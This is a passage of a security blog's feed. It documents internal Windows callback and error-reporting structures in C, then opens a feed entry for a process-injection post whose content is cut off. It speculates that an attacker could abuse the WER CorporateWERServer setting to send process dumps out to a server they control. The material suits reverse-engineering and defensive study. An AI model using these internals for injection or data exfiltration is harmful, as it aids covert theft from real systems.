#808030;\">*</span>PLDR_DLL_UNLOADED_NOTIFICATION_DATA<span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #603000;\">VOID</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">CALLBACK</span> <span style=\"color: #808030;\">*</span>PLDR_DLL_NOTIFICATION_FUNCTION<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">(</span>\n    <span style=\"color: #603000;\">ULONG</span>                       NotificationReason<span style=\"color: #808030;\">,</span>\n    PLDR_DLL_NOTIFICATION_DATA  NotificationData<span style=\"color: #808030;\">,</span>\n    <span style=\"color: #603000;\">PVOID</span>                       Context<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">union</span> _LDR_DLL_NOTIFICATION_DATA <span style=\"color: #800080;\">{</span>\n    LDR_DLL_LOADED_NOTIFICATION_DATA   Loaded<span style=\"color: #800080;\">;</span>\n    LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> LDR_DLL_NOTIFICATION_DATA<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PLDR_DLL_NOTIFICATION_DATA<span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _LDR_DLL_NOTIFICATION_ENTRY <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">LIST_ENTRY</span>                     List<span style=\"color: #800080;\">;</span>\n    PLDR_DLL_NOTIFICATION_FUNCTION Callback<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PVOID</span>                          Context<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> LDR_DLL_NOTIFICATION_ENTRY<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PLDR_DLL_NOTIFICATION_ENTRY<span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> NTSTATUS<span style=\"color: #808030;\">(</span>NTAPI <span style=\"color: #808030;\">*</span>_LdrRegisterDllNotification<span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">(</span>\n    <span style=\"color: #603000;\">ULONG</span>                          Flags<span style=\"color: #808030;\">,</span>\n    PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction<span style=\"color: #808030;\">,</span>\n    <span style=\"color: #603000;\">PVOID</span>                          Context<span style=\"color: #808030;\">,</span>\n    <span style=\"color: #603000;\">PVOID</span>                          <span style=\"color: #808030;\">*</span>Cookie<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n<span style=\"color: #800000; font-weight: bold;\">typedef</span> NTSTATUS<span style=\"color: #808030;\">(</span>NTAPI <span style=\"color: #808030;\">*</span>_LdrUnregisterDllNotification<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PVOID</span> Cookie<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-06 21:54:32 UTC --></p>\n<h2 id=\"smc\">5. Secure Memory</h2>\n<p>Kernel drivers can secure user-space memory using <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-mmsecurevirtualmemory\">ntoskrnl!MmSecureVirtualMemory</a>. This prevents the memory being freed or having its page protection made more restrictive. i.e PAGE_NOACCESS. To monitor changes, developers can install a callback using <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-psecure_memory_cache_callback\">AddSecureMemoryCacheCallback</a>. Entries of type RTL_SEC_MEM_ENTRY are located at <strong><var>ntdll!RtlpSecMemListHead</var></strong>.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #603000;\">BOOLEAN</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">CALLBACK</span> <span style=\"color: #808030;\">*</span>PSECURE_MEMORY_CACHE_CALLBACK<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PVOID</span><span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">SIZE_T</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _RTL_SEC_MEM_ENTRY <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">LIST_ENTRY</span>                    Links<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">ULONG</span>                         Revision<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">ULONG</span>                         Reserved<span style=\"color: #800080;\">;</span>\n    PSECURE_MEMORY_CACHE_CALLBACK Callback<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> RTL_SEC_MEM_ENTRY<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PRTL_SEC_MEM_ENTRY<span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-06 20:43:59 UTC --></p>\n<h2 id=\"cfm\">6. Configuration Manager (CM)</h2>\n<p>A process can register for Plug and Play events using <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/cfgmgr32/nf-cfgmgr32-cm_register_notification\">cfgmgr32!CM_Register_Notification.</a> Microsoft recommends legacy systems up to Windows 7 use <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-registerdevicenotificationa\">RegisterDeviceNotification</a>, but I didn&#8217;t examine that function. Notification entries of type _HCMNOTIFICATION are located at <strong><var>cfgmgr32!EventSystemClientList</var></strong>. _CM_CALLBACK_INFO is the structure sent to \\Device\\DeviceApi\\CMNotify when a process registers a callback. As you can see from the WnfSubscription field, it uses the Windows Notification Facility (WNF) to receive events.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #603000;\">DWORD</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">CALLBACK</span> <span style=\"color: #808030;\">*</span>PCM_NOTIFY_CALLBACK<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">(</span>\n    _In_     HCMNOTIFICATION       hNotify<span style=\"color: #808030;\">,</span>\n    _In_opt_ <span style=\"color: #603000;\">PVOID</span>                 Context<span style=\"color: #808030;\">,</span>\n    _In_     CM_NOTIFY_ACTION      Action<span style=\"color: #808030;\">,</span>\n    _In_     PCM_NOTIFY_EVENT_DATA EventData<span style=\"color: #808030;\">,</span>\n    _In_     <span style=\"color: #603000;\">DWORD</span>                 EventDataSize<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _CM_CALLBACK_INFO <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">WCHAR</span>              ModulePath<span style=\"color: #808030;\">[</span>MAX_PATH<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n    CM_NOTIFY_FILTER   EventFilter<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span><span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _tagHCMNOTIFICATION <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">USHORT</span>                  Signature<span style=\"color: #800080;\">;</span>             <span style=\"color: #696969;\">// 0xF097</span>\n    SRWLOCK                 SharedLock<span style=\"color: #800080;\">;</span>\n    CONDITION_VARIABLE      ConditionVar<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">LIST_ENTRY</span>              EventSystemClientList<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">LIST_ENTRY</span>              EventSystemPendingClients<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">BOOL</span>                    Active<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">BOOL</span>                    InProgress<span style=\"color: #800080;\">;</span>\n    CM_NOTIFY_FILTER        EventFilter<span style=\"color: #800080;\">;</span>\n    PCM_NOTIFY_CALLBACK     Callback<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PVOID</span>                   Context<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">HANDLE</span>                  NotifyFile<span style=\"color: #800080;\">;</span>    <span style=\"color: #696969;\">// handle for \\Device\\DeviceApi\\CMNotify</span>\n    PWNF_USER_SUBSCRIPTION  WnfSubscription<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">LIST_ENTRY</span>              Links<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> _HCMNOTIFICATION<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>_PHCMNOTIFICATION<span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-06 20:44:16 UTC --></p>\n<h2 id=\"veh\">7. Vectored Exception Handling (VEH)</h2>\n<p>When kernelbase!KernelBaseBaseDllInitialize is executed, it installs an exception handler kernelbase!UnhandledExceptionFilter via <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-setunhandledexceptionfilter\">SetUnhandledExceptionFilter</a>. Unless a Vectored Exception Handler (VEH) is installed afterwards, this is the top level handler executed for any faults that occur. VEH callbacks installed using <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler\">AddVectoredExceptionHandler</a> or <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredcontinuehandler\">AddVectoredContinueHandler</a> are located at <strong><var>ntdll!LdrpVectorHandlerList</var></strong></p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #696969;\">// vectored handler list</span>\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _RTL_VECTORED_HANDLER_LIST <span style=\"color: #800080;\">{</span>\n    SRWLOCK                    Lock<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">LIST_ENTRY</span>                  List<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> RTL_VECTORED_HANDLER_LIST<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PRTL_VECTORED_HANDLER_LIST<span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #696969;\">// exception handler entry</span>\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _RTL_VECTORED_EXCEPTION_ENTRY <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">LIST_ENTRY</span>                  List<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PULONG_PTR</span>                  Flag<span style=\"color: #800080;\">;</span>           <span style=\"color: #696969;\">// some flag related to CFG</span>\n    <span style=\"color: #603000;\">ULONG</span>                       RefCount<span style=\"color: #800080;\">;</span>\n    PVECTORED_EXCEPTION_HANDLER VectoredHandler<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> RTL_VECTORED_EXCEPTION_ENTRY<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PRTL_VECTORED_EXCEPTION_ENTRY<span style=\"color: #800080;\">;</span>  \n</pre>\n<p><!--Created using ToHtml.com on 2020-08-06 20:44:34 UTC -->  </p>\n<h2 id=\"wer\">8. Windows Error Reporting (WER)</h2>\n<p>Windows provides API to enable application recovery, dumping process memory and generating reports via the WER service. WER settings for a process can be located within the Process Environment Block (PEB) at <strong><var>WerRegistrationData</var></strong>.</p>\n<h3 id=\"block\">8.1 PEB Header Block</h3>\n<p>I&#8217;ll discuss structures separately, but for the few that aren&#8217;t. <strong><var>Signature</var></strong> is set internally by kernelbase!WerpInitPEBStore and simply contains the string &#8220;PEB_SIGNATURE&#8221;. <strong><var>AppDataRelativePath</var></strong> is set by <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/werapi/nf-werapi-werregisterapplocaldump\">WerRegisterAppLocalDump</a>. <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-registerapplicationrestart\">kernelbase!RegisterApplicationRestart</a> can be used to set <strong><var>RestartCommandLine</var></strong>, which is used as the command line when the process is to be eh..restarted. <img alt=\"\ud83d\ude42\" class=\"wp-smiley\" src=\"https://s0.wp.com/wp-content/mu-plugins/wpcom-smileys/twemoji/2/72x72/1f642.png\" style=\"height: 1em;\" /> </p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _WER_PEB_HEADER_BLOCK <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">LONG</span>                 Length<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">WCHAR</span>                Signature<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">16</span><span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">WCHAR</span>                AppDataRelativePath<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">64</span><span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">WCHAR</span>                RestartCommandLine<span style=\"color: #808030;\">[</span>RESTART_MAX_CMD_LINE<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n    WER_RECOVERY_INFO    RecoveryInfo<span style=\"color: #800080;\">;</span>\n    PWER_GATHER          Gather<span style=\"color: #800080;\">;</span>\n    PWER_METADATA        MetaData<span style=\"color: #800080;\">;</span>\n    PWER_RUNTIME_DLL     RuntimeDll<span style=\"color: #800080;\">;</span>\n    PWER_DUMP_COLLECTION DumpCollection<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">LONG</span>                 GatherCount<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">LONG</span>                 MetaDataCount<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">LONG</span>                 DumpCount<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">LONG</span>                 Flags<span style=\"color: #800080;\">;</span>\n    WER_HEAP_MAIN_HEADER MainHeader<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PVOID</span>                Reserved<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> WER_PEB_HEADER_BLOCK<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PWER_PEB_HEADER_BLOCK<span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-06 20:49:52 UTC --></p>\n<h3 id=\"recinfo\">8.2 Recovery Information</h3>\n<p>A recovery callback can be installed using <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-registerapplicationrecoverycallback\">kernel32!RegisterApplicationRecoveryCallback</a>. <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getapplicationrecoverycallback\">kernelbase!GetApplicationRecoveryCallback</a> will read the Callback, Parameter, PingInterval and Flags from a remote process. <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-applicationrecoveryfinished\">kernel32!ApplicationRecoveryFinished</a> can read if the Finished event is signalled. <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-applicationrecoveryinprogress\">ApplicationRecoveryInProgress</a> will determine if the InProgress event is signalled. <strong><var>Started</var></strong> is a handle, but I&#8217;m unsure what it&#8217;s for exactly.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _WER_RECOVERY_INFO <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">ULONG</span>                Length<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PVOID</span>                Callback<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PVOID</span>                Parameter<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">HANDLE</span>               Started<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">HANDLE</span>               Finished<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">HANDLE</span>               InProgress<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">LONG</span>                 LastError<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">BOOL</span>                 Successful<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">DWORD</span>                PingInterval<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">DWORD</span>                Flags<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> WER_RECOVERY_INFO<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PWER_RECOVERY_INFO<span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-06 20:50:13 UTC --></p>\n<h3 id=\"gathers\">8.3 Gathers</h3>\n<p>As part of a report created by WER, <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/werapi/nf-werapi-werregistermemoryblock\">kernelbase!WerRegisterMemoryBlock</a> inserts information about a range of memory that should be included. It&#8217;s also possible to exclude a range of memory using <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/werapi/nf-werapi-werregisterexcludedmemoryblock\">kernelbase!WerRegisterExcludedMemoryBlock</a>, which internally sets bit 15 of the <strong><var>Flags</var></strong> in a WER_GATHER structure. Files that might otherwise be excluded from a report can also be saved via <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/werapi/nf-werapi-werregisterfile\">kernelbase!WerRegisterFile</a>.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _WER_FILE <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">USHORT</span>               Flags<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">WCHAR</span>                Path<span style=\"color: #808030;\">[</span>MAX_PATH<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> WER_FILE<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PWER_FILE<span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _WER_MEMORY <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">PVOID</span>                Address<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">ULONG</span>                Size<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> WER_MEMORY<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PWER_MEMORY<span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _WER_GATHER <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">PVOID</span>                Next<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">USHORT</span>               Flags<span style=\"color: #800080;\">;</span>    \n    <span style=\"color: #800000; font-weight: bold;\">union</span> <span style=\"color: #800080;\">{</span>\n      WER_FILE           File<span style=\"color: #800080;\">;</span>\n      WER_MEMORY         Memory<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span> v<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> WER_GATHER<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PWER_GATHER<span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-06 20:50:31 UTC --></p>\n<h3 id=\"metadata\">8.4 Custom Meta Data</h3>\n<p>Applications can register custom meta data using <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/werapi/nf-werapi-werregistercustommetadata\">kernelbase!WerRegisterCustomMetadata</a>.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _WER_METADATA <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">PVOID</span>                Next<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">WCHAR</span>                Key<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">64</span><span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">WCHAR</span>                Value<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">128</span><span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> WER_METADATA<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PWER_METADATA<span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-06 20:50:45 UTC --></p>\n<h3 id=\"runtime\">8.5 Runtime DLL</h3>\n<p>Developers might want to customize the reporting process and that&#8217;s what <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/werapi/nf-werapi-werregisterruntimeexceptionmodule\">kernelbase!WerRegisterRuntimeExceptionModule</a> is for. It inserts the path of DLL into the registration data that&#8217;s loaded by werfault.exe once an exception occurs. In the WER_RUNTIME_DLL structure, MAX_PATH is used for CallbackDllPath, but the correct length for the structure and DLL should be read from the <strong><var>Length</var></strong> field.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _WER_RUNTIME_DLL <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">PVOID</span>                Next<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">ULONG</span>                Length<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PVOID</span>                Context<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">WCHAR</span>                CallbackDllPath<span style=\"color: #808030;\">[</span>MAX_PATH<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> WER_RUNTIME_DLL<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PWER_RUNTIME_DLL<span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-06 20:50:59 UTC --></p>\n<h3 id=\"dump\">8.6 Dump Collections</h3>\n<p>If more than one process is required for dumping, an application can use <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/werapi/nf-werapi-werregisteradditionalprocess\">kernelbase!WerRegisterAdditionalProcess</a> to specify the process and thread ids. I&#8217;m open to correction, but it appears that only one thread per process is allowed by the API.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _WER_DUMP_COLLECTION <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">PVOID</span>                Next<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">DWORD</span>                ProcessId<span style=\"color: #800080;\">;</span>   \n    <span style=\"color: #603000;\">DWORD</span>                ThreadId<span style=\"color: #800080;\">;</span> \n<span style=\"color: #800080;\">}</span> WER_DUMP_COLLECTION<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PWER_DUMP_COLLECTION<span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-06 20:51:12 UTC --></p>\n<h3 id=\"main_header\">8.7 Heap Main Header</h3>\n<p>Finally, the main heap header used for dynamic allocation of memory for WER structures. The signature here should contain a string &#8220;HEAP_SIGNATURE&#8221;. The mutex is simply for exclusive access during allocations. FreeHeap may be inaccurate, but it appears to be used to improve performance of memory allocations. Instead of requesting a new block of memory from the OS, WER functions can use from this block if possible.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _WER_HEAP_MAIN_HEADER <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">WCHAR</span>                Signature<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">16</span><span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">LIST_ENTRY</span>           Links<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">HANDLE</span>               Mutex<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PVOID</span>                FreeHeap<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">ULONG</span>                FreeCount<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> WER_HEAP_MAIN_HEADER<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PWER_HEAP_MAIN_HEADER<span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-06 20:51:43 UTC --></p>\n<p>The WER service could be a point of privilege escalation and lateral movement. There&#8217;s potential to use it for exfiltration of sensitive data by modifying information in the <a href=\"https://docs.microsoft.com/en-us/windows/win32/wer/wer-settings\">registry settings</a>. An attacker may be capable of dumping a process and having a report sent to a server they control using the CorporateWERServer setting. They might also use their own public key to encrypt this data and prevent recovery of what exactly is being gathered. This is all hypothetical of course and I don&#8217;t know if it can actually be used for this.</p>"
                }
            ],
            "wfw_commentrss": "https://modexp.wordpress.com/2020/08/06/windows-data-structures-and-callbacks-part-1/feed/",
            "slash_comments": "0",
            "media_thumbnail": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/08/data_structs_part1.png"
                }
            ],
            "href": "",
            "media_content": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/08/data_structs_part1.png",
                    "medium": "image"
                },
                {
                    "url": "https://0.gravatar.com/avatar/6505a0ec0ae84dac45856b91b0cc2343?s=96&d=identicon&r=G",
                    "medium": "image"
                }
            ]
        },
        {
            "title": "Windows Process Injection: Command Line and Environment Variables",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Windows Process Injection: Command Line and Environment Variables"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://modexp.wordpress.com/2020/07/31/wpi-cmdline-envar/"
                }
            ],
            "link": "https://modexp.wordpress.com/2020/07/31/wpi-cmdline-envar/",
            "comments": "https://modexp.wordpress.com/2020/07/31/wpi-cmdline-envar/#respond",
            "authors": [
                {
                    "name": "odzhan"
                }
            ],
            "author": "odzhan",
            "author_detail": {
                "name": "odzhan"
            },
            "published": "Fri, 31 Jul 2020 04:00:38 +0000",
            "published_parsed": [
                2020,
                7,
                31,
                4,
                0,
                38,
                4,
                213,
                0
            ],
            "tags": [
                {
                    "term": "assembly",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "injection",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "malware",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "process injection",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "programming",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "redteam",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "security",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "shellcode",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "windows",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "command line",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "environment variables",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "peb",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "windows process injection",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "http://modexp.wordpress.com/?p=5044",
            "guidislink": false,
            "summary": "Windows Process Injection: Command Line and Environment Variables Contents Introduction Shellcode Environment Variables Command Line Window Title Runtime Data 1. Introduction There are many ways to load shellcode into the address space of a process, but knowing precisely where it&#8217;s &#8230; <a href=\"https://modexp.wordpress.com/2020/07/31/wpi-cmdline-envar/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Windows Process Injection: Command Line and Environment Variables Contents Introduction Shellcode Environment Variables Command Line Window Title Runtime Data 1. Introduction There are many ways to load shellcode into the address space of a process, but knowing precisely where it&#8217;s &#8230; <a href=\"https://modexp.wordpress.com/2020/07/31/wpi-cmdline-envar/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://modexp.wordpress.com/feed/",
